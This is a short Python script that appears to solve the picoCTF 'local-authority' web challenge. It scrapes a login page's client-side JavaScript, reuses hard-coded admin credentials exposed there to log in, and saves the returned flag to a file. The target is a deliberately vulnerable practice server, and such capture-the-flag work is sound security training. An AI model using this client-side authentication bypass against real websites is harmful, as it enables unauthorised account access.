import requests

from bs4 import BeautifulSoup

import re

def password_found(pw: str) -> str:
    name = __file__.split(".")[0]
    
    dir = f"{name}-flag.txt"

    print(f"Password Found : {pw}\n")

    print(f"Saving password to {dir}", end="...")
    
    with open(dir, "w+") as f:
        f.write(pw)

    print("Done\n")

    return dir

url = "http://saturn.picoctf.net:49661"

r = requests.get(url)

content = r.text
soup = BeautifulSoup(content, features="html.parser")

data = {
    "username": "test",
    "password": "test",
    "login": ""
}

r = requests.post(url=url+"/login.php", data=data)

content = r.text

soup = BeautifulSoup(content, features="html.parser")
script = soup.find("script")
src = script.attrs["src"]

r = requests.get(url=url+f"/{src}")

content = r.text
soup = BeautifulSoup(content, features="html.parser")
text = soup.get_text("\n")

with open("./web exploitation/local-authority/secure.js", "w+") as f:
    f.write(text)

data = {
    "username": "admin",
    "password": "strongPassword098765",
    "login": ""
}

r = requests.post(url=url+"/login.php", data=data)

content = r.text

soup = BeautifulSoup(content, features="html.parser")

data = {
    "hash": "2196812e91c29df34f5e217cfd639881"
}

r = requests.post(url=url+"/admin.php", data=data)

content = r.text

soup = BeautifulSoup(content, features="html.parser")
body = soup.find("body")
result = body.get_text()
result = result.strip()

dir = password_found(result)